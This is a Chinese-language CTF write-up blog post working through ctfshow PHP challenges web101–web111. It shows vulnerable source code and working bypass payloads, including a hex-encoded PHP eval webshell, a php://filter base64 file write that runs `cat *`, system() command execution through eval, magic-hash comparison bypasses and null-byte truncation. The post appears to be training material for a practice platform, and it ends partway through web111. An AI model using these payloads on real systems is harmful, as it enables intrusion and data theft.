<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701057.png"></p>
<h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
include(&quot;ctfshow.php&quot;);
&#x2F;&#x2F;flag in class ctfshow;
$ctfshow &#x3D; new ctfshow();
$v1&#x3D;$_GET[&#39;v1&#39;];
$v2&#x3D;$_GET[&#39;v2&#39;];
$v3&#x3D;$_GET[&#39;v3&#39;];
$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0)&#123;
  if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\;|\?|[0-9]&#x2F;&quot;, $v2))&#123;
    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\?|[0-9]&#x2F;&quot;, $v3))&#123;
      eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);
    &#125;
  &#125;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>与上题差不多，但是过滤了更多的东西</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">v2和v3的值仅能有 &amp;(:&lt;&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZ]abcdefghijklmnopqrstuvwxyz|&#125;!$&#39;()+,.&#x2F;;&#x3D;[]_<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>开始我还在想着与php100一样通过命令执行拿到flag，但怎么试都拿不到，后来上网看大佬的wp，发现本题考点是反射类</p>
<blockquote>
<p>PHP 的反射API很多，但是常用的一般都是 <code>ReflectionClass</code> 和 <code>ReflectionMethod</code>:<br>1.ReflectionClass，这个是用来获取类的信息                                                                                                        常用方法，详细的可以查看文档：                                                                                                      ReflectionClass::getMethods     获取方法的数组<br>ReflectionClass::getName        获取类名<br>ReflectionClass::hasMethod      检查方法是否已定义<br>ReflectionClass::hasProperty    检查属性是否已定义<br>ReflectionClass::isAbstract     检查类是否是抽象类（abstract）<br>ReflectionClass::isFinal        检查类是否声明为 final<br>ReflectionClass::isInstantiable 检查类是否可实例化<br>ReflectionClass::newInstance    从指定的参数创建一个新的类实例</p>
<p>2.ReflectionMethod<br>这个主要是针对方法的反射                                                                                                                                                        常用的方法，详细的可以去看看文档：                                                                                          ReflectionMethod::invoke        执行<br>ReflectionMethod::invokeArgs    带参数执行<br>ReflectionMethod::isAbstract    判断方法是否是抽象方法<br>ReflectionMethod::isConstructor 判断方法是否是构造方法<br>ReflectionMethod::isDestructor  判断方法是否是析构方法<br>ReflectionMethod::isFinal       判断方法是否定义 final<br>ReflectionMethod::isPrivate     判断方法是否是私有方法<br>ReflectionMethod::isProtected   判断方法是否是保护方法 (protected)<br>ReflectionMethod::isPublic      判断方法是否是公开方法<br>ReflectionMethod::isStatic      判断方法是否是静态方法<br>ReflectionMethod::setAccessible 设置方法是否访问</p>
<p>引用<a target="_blank" rel="noopener" href="https://learnku.com/articles/7538/the-application-of-reflection-in-php">反射在 PHP 中的应用 | Laravel China 社区 (learnku.com)</a></p>
</blockquote>
<p>所以我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">url+&#x2F;?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701414.png"></p>
<h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
$v1 &#x3D; $_POST[&#39;v1&#39;];
$v2 &#x3D; $_GET[&#39;v2&#39;];
$v3 &#x3D; $_GET[&#39;v3&#39;];
$v4 &#x3D; is_numeric($v2) and is_numeric($v3);
if($v4)&#123;
  $s &#x3D; substr($v2,2);
  $str &#x3D; call_user_func($v1,$s);
  echo $str;
  file_put_contents($v3,$str);
&#125;
else&#123;
  die(&#39;hacker&#39;);
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>file_put_contents()、is_numeric的作用就不做赘述，在上面php99已经涉及到，</p>
<p>剩下就是substr函数</p>
<pre class="line-numbers language-none"><code class="language-none">substr() 函数返回字符串的一部分。
注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。
-----------------------语法---------------------------------
substr(string,start,length)
参数	   描述
string	必需。规定要返回其中一部分的字符串。
start	必需。规定在字符串的何处开始。
正数 - 在字符串的指定位置开始
负数 - 在从字符串结尾的指定位置开始
0 - 在字符串中的第一个字符处开始
length	可选。规定要返回的字符串长度。默认是直到字符串的结尾。
正数 - 从 start 参数所在的位置返回
负数 - 从字符串末端返回

call_user_func()
调用回调函数，并把一个数组参数作为回调函数的参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><p>那么可知$s的值就是从$v2传入的参从第二位开始截取。而且仍然考到赋值与and的优先性，所以我们只需要确保$v2可以满足这个is_numeric判断，通过file_put_contents()我们可以确定的是$v3是一个php文件以便一句话木马的写入，那么现在v2的可考虑性就是如何既能满足is_numeric函数又可以变成一句话木马。</p>
<p>这里需要用到hex2bin函数，也就是为$v1传参hex2bin以此再通过call_user_func()回调。</p>
<pre class="line-numbers language-none"><code class="language-none">hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。
----------------语法-----------------------------------
hex2bin(string)
参数	描述
string	必需。要转换的十六进制值。
技术细节
返回值：	返回转换字符串的 ASCII 字符，如果失败则返回 FALSE。
PHP 版本：	5.4.0+
更新日志：	自 PHP 5.4.1 起，如果字符串长度为奇数，则抛出一个警告。在 PHP 5.4.0 中，奇数字符串被默默接受，但是最后一个字节会被移除。
自 PHP 5.5.1 起，如果字符串是无效的十六进制字符串，则抛出一个警告。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>is_numeric()判断十六进制即0x开头，在php5时返回True，在php7返回False</p>
</blockquote>
<p>而之后经过substr截断后，$str就是一个没有0x开头的16进制数，再通过call_user_func回调hex2bin函数将该16进制转换为ASCII字符，就可以得到一个一句话木马（注：hex2bin无法转换带0x的16进制数）</p>
<p>所以我们可以如此构造 </p>
<blockquote>
<p>GET: v2&#x3D;0x3c3f70687020406576616c28245f504f53545b2731275d293b3f3e&amp;v3&#x3D;1.php</p>
<?php @eval($_POST['1']);?>

<p>POST: v1&#x3D;hex2bin</p>
</blockquote>
<p>但是可惜的是，这题是php7，所以那个if判断我们没法绕过去，所以只能用另一种方式来达到目的。</p>
<h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p>那么我们现在要考虑的就是如何在php7中使得$v2传入的参既能满足is_numeric函数，又能被当成一句话木马被写入呢，这里需要用到base64_encode以及php伪协议来满足</p>
<pre class="line-numbers language-none"><code class="language-none">$a&#x3D;&quot;xxx&quot;;
$b&#x3D;base64_encode($a);
$c&#x3D;bin2hex($b);
只要满足$c纯数字即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后我们传入$c的值满足is_numeric函数，然后再通过call_user_func函数回调hex2bin()将其转换为base64编码，再通过利用php伪协议读取的$v3文件以此来解码这个base64编码并利用file_put_contents写入。</p>
<p>这里直接用大佬所找到的$a</p>
<blockquote>
<p>即$a为’&lt;?&#x3D;`cat *&#96;;’;</p>
<p>通过base64_encode编码后为PD89YGNhdCAqYDs，再通过bin2hex后转换为5044383959474e6864434171594473(仅有1个e可以表明其为科学计数法，从而可以绕过is_numeric函数)</p>
</blockquote>
<p>最后构造</p>
<blockquote>
<p>GET: v2&#x3D;125044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p>
<p>（因为有substr函数会截断前俩个，所以为确保代码完整性，我们在这之前随便加俩个数字）</p>
<p>POST: v1&#x3D;hex2bin</p>
</blockquote>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700415.png"></p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700410.png"></p>
<h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
$v1 &#x3D; $_POST[&#39;v1&#39;];
$v2 &#x3D; $_GET[&#39;v2&#39;];
$v3 &#x3D; $_GET[&#39;v3&#39;];
$v4 &#x3D; is_numeric($v2) and is_numeric($v3);
if($v4)&#123;
  $s &#x3D; substr($v2,2);
  $str &#x3D; call_user_func($v1,$s);
  echo $str;
  if(!preg_match(&quot;&#x2F;.*p.*h.*p.*&#x2F;i&quot;,$str))&#123;
    file_put_contents($v3,$str);
  &#125;
  else&#123;
    die(&#39;Sorry&#39;);
  &#125;
&#125;
else&#123;
  die(&#39;hacker&#39;);
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>与php102相同，不过添加了一个对$str的过滤条件，确保其内没有php标签，这样的正则表达式会匹配包含 “php”、”pahp”、”paahp” 等的字符串。</p>
<p>但是根据php102，echo出的$str为PD89YGNhdCAqYDs，里面并没有。所以可以和php102构造一模一样的参</p>
<blockquote>
<p>GET: v2&#x3D;125044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p>
<p>（因为有substr函数会截断前俩个，所以为确保代码完整性，我们在这之前随便加俩个数字）</p>
<p>POST: v1&#x3D;hex2bin</p>
</blockquote>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700510.png"></p>
<h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
  $v1 &#x3D; $_POST[&#39;v1&#39;];
  $v2 &#x3D; $_GET[&#39;v2&#39;];
  if(sha1($v1)&#x3D;&#x3D;sha1($v2))&#123;
    echo $flag;
  &#125;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>SHA1弱等于，可以采取数组绕过，不过要注意v1和v2的传参方式，可构造</p>
<pre class="line-numbers language-none"><code class="language-none">GET：v2[]&#x3D;1
POST：v1[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700410.png"></p>
<p>或者构造</p>
<pre class="line-numbers language-none"><code class="language-none">GET：v2&#x3D;10932435112
POST：v1&#x3D;aaroZmOk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700264.png"></p>
<blockquote>
<p>参考</p>
<p>md5：</p>
<p>240610708:0e462097431906509019562988736854<br>QLTHNDT:0e405967825401955372549139051580<br>QNKCDZO:0e830400451993494058024219903391<br>PJNPDWY:0e291529052894702774557631701704<br>NWWKITQ:0e763082070976038347657360817689<br>NOOPCJF:0e818888003657176127862245791911<br>MMHUWUV:0e701732711630150438129209816536<br>MAUXXQC:0e478478466848439040434801845361</p>
<p>sha1：</p>
<p>10932435112: 0e07766915004133176347055865026311692244<br>aaroZmOk: 0e66507019969427134894567494305185566735<br>aaK1STfY: 0e76658526655756207688271159624026011393<br>aaO8zKZF: 0e89257456677279068558073954252716165668<br>aa3OFF9m: 0e36977786278517984959260394024281014729<br>0e1290633704: 0e19985187802402577070739524195726831799</p>
</blockquote>
<p>大佬链接——&gt;<a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120973888">PHP—MD5和sha1绕过_php字符串弱不等,sha1强相等-CSDN博客</a></p>
<h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
include(&#39;flag.php&#39;);
error_reporting(0);
$error&#x3D;&#39;你还想要flag嘛？&#39;;
$suces&#x3D;&#39;既然你想要那给你吧！&#39;;
foreach($_GET as $key &#x3D;&gt; $value)&#123;
  if($key&#x3D;&#x3D;&#x3D;&#39;error&#39;)&#123;
    die(&quot;what are you doing?!&quot;);
  &#125;
  $$key&#x3D;$$value;
&#125;foreach($_POST as $key &#x3D;&gt; $value)&#123;
  if($value&#x3D;&#x3D;&#x3D;&#39;flag&#39;)&#123;
    die(&quot;what are you doing?!&quot;);
  &#125;
  $$key&#x3D;$$value;
&#125;
if(!($_POST[&#39;flag&#39;]&#x3D;&#x3D;$flag))&#123;
  die($error);
&#125;
echo &quot;your are good&quot;.$flag.&quot;\n&quot;;
die($suces);

?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本题考查的为php变量覆盖，题目共有三个变量$error、$suces、$flag</p>
<p>让key&#x3D;suces, 那么可知key&#x3D;suces，然后如果value&#x3D;flag，那么可知value&#x3D;flag，此时变量覆盖，suces&#x3D;flag</p>
<p>可以通过俩个die函数获得flag</p>
<h4 id="第一个-die-error"><a href="#第一个-die-error" class="headerlink" title="第一个  die($error)"></a>第一个  die($error)</h4><p>通过构造</p>
<blockquote>
<p>GET: abc&#x3D;flag                                                                                                                                                              POST: error&#x3D;abc</p>
</blockquote>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700040.png"></p>
<p>传入后$key存储abc,$value存储flag，此时$abc&#x3D;$flag，然后再第二个foreach循环中，$key&#x3D;error，$value&#x3D;abc,那么他下面$value的强等于就没有触发，而是变量覆盖，$error&#x3D;$abc。此时由于$abc为$flag，$error&#x3D;$abc，那么就是$error&#x3D;$abc，即$error&#x3D;$flag。由于 POST 请求中没有名为 <code>flag</code> 的参数，所以 <code>$flag</code> 这个变量的值将保持不变。因此，当执行 <strong>if(!($_POST[‘flag’]&#x3D;&#x3D;$flag)){ die($error); }</strong> 这一行代码时，它实际上是在检查 POST 请求中是否存在 <code>flag</code> 参数，但是由于不存在，所以条件始终为真。因此，触发die函数，也就是触发die($flag)，得到flag的值</p>
<h4 id="第二个-die-suces"><a href="#第二个-die-suces" class="headerlink" title="第二个   die($suces)"></a>第二个   die($suces)</h4><p>通过构造</p>
<blockquote>
<p>GET: suces&#x3D;flag                                                                                                                                                            POST: flag&#x3D;</p>
</blockquote>
<p>同理传入后$key&#x3D;$suces，$value&#x3D;$flag，此时$suces&#x3D;$flag。然后第二个foreach循环中，$key&#x3D;$flag，$value&#x3D;NULL，即$flag&#x3D;NULL，满足**($_POST[‘flag’]&#x3D;&#x3D;$flag)**，即检查到了$flag参数，那么就跳过该if判断，得到$flag的值，</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191655123.png"></p>
<h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
include(&quot;flag.php&quot;);

if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
  $v1 &#x3D; $_POST[&#39;v1&#39;];
  $v2 &#x3D; $_GET[&#39;v2&#39;];
  if(sha1($v1)&#x3D;&#x3D;sha1($v2) &amp;&amp; $v1!&#x3D;$v2)&#123;
    echo $flag;
  &#125;
&#125;

?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跟php104差不多，唯一区别就是多了个$v1!&#x3D;$v2,但是在$104的俩种解法仍可以使用。</p>
<h4 id="第一种-数组绕过"><a href="#第一种-数组绕过" class="headerlink" title="第一种  数组绕过"></a>第一种  数组绕过</h4><pre class="line-numbers language-none"><code class="language-none">可构造
GET：v2[]&#x3D;1
POST：v1[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700744.png"></p>
<h4 id="第二种-sha1弱等于"><a href="#第二种-sha1弱等于" class="headerlink" title="第二种 sha1弱等于"></a>第二种 sha1弱等于</h4><pre class="line-numbers language-none"><code class="language-none">可构造
GET：v2&#x3D;10932435112
POST：v1&#x3D;aaroZmOk

其他供选择的值
sha1：
10932435112: 0e07766915004133176347055865026311692244
aaroZmOk: 0e66507019969427134894567494305185566735
aaK1STfY: 0e76658526655756207688271159624026011393
aaO8zKZF: 0e89257456677279068558073954252716165668
aa3OFF9m: 0e36977786278517984959260394024281014729
0e1290633704: 0e19985187802402577070739524195726831799<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191703948.png"></p>
<h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

if(isset($_POST[&#39;v1&#39;]))&#123;
  $v1 &#x3D; $_POST[&#39;v1&#39;];
  $v3 &#x3D; $_GET[&#39;v3&#39;];
    parse_str($v1,$v2);
    if($v2[&#39;flag&#39;]&#x3D;&#x3D;md5($v3))&#123;
      echo $flag;
    &#125;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>涉及到一个函数parse_str() </p>
<pre class="line-numbers language-none"><code class="language-none">parse_str() 函数把查询字符串解析到变量中。
注释：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。
注释：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。
-------------------------------语法------------------------------
parse_str(string,array)
参数	描述
string	必需。规定要解析的字符串。
array	可选。规定存储变量的数组名称。该参数指示变量存储到数组中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>即使用 <strong>parse_str</strong> 函数将 <code>$v1</code> 解析成一个关联数组，并将结果存储在 <code>$v2</code> 中。</p>
<p>所以我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">GET: v3&#x3D;240610708
POST: v1&#x3D;flag&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>此时$v1的值为flag&#x3D;0，通过<code>parse_str($v1, $v2);</code> 将 <code>$v1</code> 解析成关联数组 <code>$v2</code>，这时 <code>$v2</code> 变成 <code>array(&#39;flag&#39; =&gt; &#39;0&#39;)</code>。</p>
<p>所以第二个语句就变成if(0&#x3D;&#x3D;md5($v3))即可echo出flag，那么结合我们前面所学，有以下这些值md5后为0，随机挑选一个即可。</p>
<blockquote>
<p>md5：                                                                                                       240610708:0e462097431906509019562988736854<br>QLTHNDT:0e405967825401955372549139051580<br>QNKCDZO:0e830400451993494058024219903391<br>PJNPDWY:0e291529052894702774557631701704<br>NWWKITQ:0e763082070976038347657360817689<br>NOOPCJF:0e818888003657176127862245791911<br>MMHUWUV:0e701732711630150438129209816536<br>MAUXXQC:0e478478466848439040434801845361</p>
</blockquote>
<h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])&#x3D;&#x3D;&#x3D;FALSE) &#123;
  die(&#39;error&#39;);

&#125;
&#x2F;&#x2F;只有36d的人才能看到flag
if(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123;
  echo $flag;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ereg函数可看该大佬<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_25987491/article/details/79952393">php中ereg函数的截断漏洞_ereg漏洞-CSDN博客</a></p>
<p>**ereg()**函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。(并且即使涉及为科学计数法，e也必须是小写)</p>
<pre class="line-numbers language-none"><code class="language-none">strrev() 函数反转字符串。
-------------------语法--------------------------
strrev(string)
参数	描述
string	必需。规定要反转的字符串。

intval() 函数用于获取变量的整数值。
intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。
-------------------语法--------------------------
int intval ( mixed $var [, int $base &#x3D; 10 ] )
参数说明：
$var：要转换成 integer 的数量值。
$base：转化所使用的进制。
如果 base 是 0，通过检测 var 的格式来决定使用的进制：
如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，
如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，
将使用 10 进制 (decimal)。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由此我们可以0x36d转换为十进制，即为877，所以将其倒置，再通过abc加上%00截断绕过ereg函数</p>
<p>可构造得到flag</p>
<pre class="line-numbers language-none"><code class="language-none">GET: c&#x3D;abc%00778<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191803960.png"></p>
<h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
  $v1 &#x3D; $_GET[&#39;v1&#39;];
  $v2 &#x3D; $_GET[&#39;v2&#39;];

  if(preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v1) &amp;&amp; preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v2))&#123;
      eval(&quot;echo new $v1($v2());&quot;);
  &#125;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>v1和v2都需要以大小写字母开头的字符，而在其if判断中的是一个eval执行一个字符串表达式。</p>
<p>我们在php101学习到了php自带的一些反射类(ReflectionClass)，(其实还有一个异常处理类 <strong>Exception</strong>，不过此时对于v1直接赋值即可，<strong>v1&#x3D;Exception();system(“ls”);&amp;v2&#x3D;a</strong>)所以我们可以先对$v1赋值一个反射类，即对应new创建，然后给v2赋值一些可执行命令，所以我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">GET: v1&#x3D;ReflectionClass&amp;v2&#x3D;system(&#39;ls&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211138857.png"></p>
<pre class="line-numbers language-none"><code class="language-none">GET: v1&#x3D;ReflectionClass&amp;v2&#x3D;system(&#39;cat f*&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>执行后打开源代码可以找到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211139618.png"></p>
<h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
  $v1 &#x3D; $_GET[&#39;v1&#39;];
  $v2 &#x3D; $_GET[&#39;v2&#39;];

  if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v1))&#123;
      die(&quot;error v1&quot;);
  &#125;
  if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v2))&#123;
      die(&quot;error v2&quot;);
  &#125;
  eval(&quot;echo new $v1($v2());&quot;);
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时v1和v2只能输入以下的字符，否则就会触发die函数</p>
<blockquote>
<p> &#x2F;&lt;&gt;?ABCDEFGHIJKLMNOPQRSTUVWXYZ]abcdefghijklmnopqrstuvwxyz|}</p>
</blockquote>
<p>可以看出，上题的构造已经没法用，其将单引号，双引号，反引号都给过滤掉了</p>
<p>看了大佬wp才了解这里考查的是php的另一个内置类  <strong>FilesystemIterator</strong>（文件系统迭代器在PHP5.3新加入，继承自DirectoryIterator，可以通过传入路径得到索引该目录下所有文件的迭代器）</p>
<p>然后通过<strong>getcwd()方法（成功时返回当前工作目录）</strong>用于返回当前路径，详情可看<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/class.filesystemiterator.php">PHP： FilesystemIterator - Manual</a>、<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.getcwd">PHP： getcwd - 手册</a></p>
<p>新建FilesystemIterator，可以显示当前目录下的文件结构。其将括号过滤，但是题目中已经给了一个括号了，所以不用在意。再通过getcwd获得该工作目录，正好就是flag存放的文件</p>
<pre class="line-numbers language-none"><code class="language-none">构造GET：v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211203450.png"></p>
<p>访问即可拿到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401211203996.png"></p>
<h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

function getFlag(&amp;$v1,&amp;$v2)&#123;
  eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);
  var_dump($$v1);
&#125;

if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
  $v1 &#x3D; $_GET[&#39;v1&#39;];
  $v2 &#x3D; $_GET[&#39;v2&#39;];

  if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v1))&#123;
      die(&quot;error v1&quot;);
  &#125;
  if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v2))&#123;
      die(&quot;error v2&quot;);
  &#125;
  
  if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $v1))&#123;
      getFlag($v1,$v2);
  &#125;
&#125;
